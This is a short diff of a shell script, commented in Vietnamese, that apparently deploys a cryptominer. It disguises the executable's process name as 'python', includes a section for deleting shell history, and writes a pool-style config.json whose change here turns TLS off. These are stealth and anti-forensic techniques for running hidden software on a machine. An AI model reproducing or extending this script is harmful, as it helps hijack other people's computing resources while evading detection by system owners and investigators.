@@ -2,8 +2,8 @@
 
 DOMAIN="$1"
 NAME_WORK="$2"
-PROCESS_PATH="python/python"   # file thực thi
-PROCESS_NAME="python"          # tên tiến trình hiển thị
+PROCESS_PATH="python/python"    # file thực thi
+PROCESS_NAME="python"           # tên tiến trình hiển thị
 CONFIG_FILE="config.json"
 
 # ❌ Xoá shell history
@@ -38,7 +38,7 @@ if [ ! -f "$CONFIG_FILE" ]; then
       "url": "$DOMAIN",
       "user": "$NAME_WORK",
       "keepalive": true,
-      "tls": true
+      "tls": false
     }
   ],
   "cpu": {
